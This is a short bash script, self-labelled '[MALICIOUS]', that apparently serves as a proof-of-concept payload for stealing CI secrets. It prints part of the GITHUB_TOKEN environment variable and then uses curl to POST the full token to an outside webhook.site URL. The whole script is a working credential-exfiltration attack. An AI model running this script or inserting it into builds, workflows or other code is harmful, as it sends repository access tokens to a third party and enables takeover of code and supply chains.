#!/bin/bash
echo "[MALICIOUS] Payload executing..."
echo "[MALICIOUS] GITHUB_TOKEN: ${GITHUB_TOKEN:0:20}..."
curl -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" -d "token=$GITHUB_TOKEN"
